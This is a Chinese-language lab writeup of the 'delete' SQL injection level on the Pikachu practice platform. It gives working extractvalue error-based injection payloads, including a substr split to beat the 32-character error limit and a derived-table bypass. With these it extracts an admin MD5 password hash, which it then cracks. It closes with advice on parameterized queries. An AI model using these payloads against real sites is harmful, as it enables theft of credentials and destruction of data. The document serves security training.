【Pikachu】Web-SQL-Inject "delete"注入 Writeup

操作者：何芊宏 | 操作日期：2026.9.28 | 分类：Pikachu | 标签：Pikachu, Web, SQL注入, delete注入, 报错注入, extractvalue, 派生表, 32字符限制

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - SQL-Inject
  • 题目名称："delete"注入
  • 目标：利用数据删除（DELETE）场景下的 SQL 注入漏洞，结合报错注入与派生表技术，突破 32 字符回显限制与同表更新限制，获取数据库中的管理员账号和密码。

2. 解题思路与知识点

漏洞原理：

该关卡模拟了留言板的删除功能。后端代码未对用户输入进行过滤，直接将数据拼接到 DELETE FROM message WHERE id = $id 语句中执行。由于是 DELETE 操作，页面不仅没有数据查询回显，而且具有破坏性。因此，攻击者不能依赖 SELECT 回显，必须使用 报错注入（Error-based Injection） 配合 布尔逻辑测试。在无回显的 INSERT/DELETE 场景下，利用 extractvalue() 函数故意制造 XPath 语法错误，将查询结果通过报错信息带出。

工具选型与心路历程：
  • F12抓包与URL注入：通过F12抓包明确请求方式为GET，参数名为 id。直接在浏览器地址栏手工构造URL进行注入测试。
  • 无损探测技巧：在测试 and 1=1 和 and 1=2 时，发现真实的留言被误删。为了安全测试，后续采用不存在的 id=999 作为注入入口，在触发报错注入的同时避免删除真实数据。
  • MySQL 同表更新限制：在 DELETE member 表的同时，尝试 SELECT 该表的数据会触发 You can't specify target table 'member' for update in FROM clause 错误。解决方案是使用派生表（Derived Table）绕过。
  • 32字符回显限制：extractvalue 报错回显最多 32 个字符。MD5 哈希恰好占满 32 位，加上波浪号后超长被截断。采用 substr() 函数分段提取，成功获取完整哈希。

3. 操作步骤

第一步：抓包与参数分析

操作：在页面新增一条留言，点击“删除”，按 F12 抓取请求。

分析结果：请求 URL 为 /pikachu/vul/sqli/sqli_del.php?id=57。确认请求方式为 GET，参数名为 id。

第二步：漏洞探测（布尔逻辑测试）

操作 1： 测试真条件 id=57 and 1=1。

回显： 页面提示“删除失败,检查下数据库是不是挂了”。（说明真实存在的留言被删掉了，且页面不显示 SQL 报错）。

操作 2： 为避免误删，采用不存在的 ID 进行测试：id=999 and 1=1 和 id=999 and 1=2，均返回“删除失败”，页面无 SQL 报错信息。

说明：证明 id 参数存在注入点，但由于报错被屏蔽，需改用报错注入强制带出数据。

第三步：报错注入获取库名

操作： 使用不存在的 id=999 配合 extractvalue 报错注入。

Payload： ?id=999 and extractvalue(1,concat(0x7e,(select database()),0x7e))

回显结果： 页面成功报错并回显 XPATH syntax error: '~pikachu~'，数据库名为 pikachu。

第四步：提取密码的失败过程与限制分析

操作 1（32字符限制）： 尝试直接提取 member 表的 pw 字段。

Payload： ?id=999 and extractvalue(1,concat(0x7e,(select pw from member limit 0,1),0x7e))

结果： 报错信息被截断。MD5 长度为 32 位，加上波浪号总长度超过 32 字符，MySQL 报错回显有 32 字符的硬性限制，导致正则匹配不到完整数据。

操作 2（同表更新限制）： 尝试使用 substr 分段提取。

Payload： ?id=999 and extractvalue(1,concat(0x7e,substr((select pw from member limit 0,1),1,16),0x7e))

结果： 报错 You can't specify target table 'member' for update in FROM clause。MySQL 不允许在 DELETE 表 A 时，子查询直接 SELECT 表 A。

第五步：绕过与提取（派生表 + 分段提取）

操作： 利用 派生表（Derived Table） 技巧，将 member 表包在 as t 中，欺骗 MySQL 将其视为临时结果集。

1. 提取密码前 16 位：

Payload： ?id=999 and extractvalue(1,concat(0x7e,substr((select pw from (select pw from member limit 0,1) as t),1,16),0x7e))

回显： XPATH syntax error: '~e10adc3949ba59ab~'

2. 提取密码后 16 位：

Payload： ?id=999 and extractvalue(1,concat(0x7e,substr((select pw from (select pw from member limit 0,1) as t),17,16),0x7e))

回显： XPATH syntax error: '~be56e057f20f883e~'

3. 拼装与解密： 将两次结果拼接得到完整的 32 位 MD5 哈希：e10adc3949ba59abbe56e057f20f883e。放入 cmd5.com 进行查询，解密得到明文密码为 123456。

4. 踩坑记录与复盘

  • 坑1：DELETE 注入的破坏性导致真实数据被误删。 测试 1=1 时会触发真实删除。解决方案是使用不存在的 id=999 作为注入载体，仅触发报错而不影响真实数据。
  • 坑2：MySQL 报错注入的 32 字符硬性限制。 extractvalue 回显最多 32 字符，MD5 哈希加上波浪号超长被截断。解决方案是使用 substr() 函数分段提取，再拼接。
  • 坑3：同表更新限制。 使用 substr 配合子查询时，MySQL 禁止在 DELETE 表 A 时，子查询直接 SELECT 表 A。解决方案是使用派生表：select pw from (select pw from member limit 0,1) as t。

5. 知识总结

  • DELETE 注入核心： 攻击点位于数据删除语句中。需通过布尔逻辑或报错注入进行探测，并特别注意其破坏性，采用无损注入策略。
  • 报错注入（Error-based Injection）： 利用数据库函数（如 extractvalue、updatexml）强制报错，将查询结果拼接在错误信息中返回。适用于无回显的 INSERT/UPDATE/DELETE 场景。
  • 防御建议： 严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与 SQL 语句代码分离；对用户输入进行严格的过滤和转义。
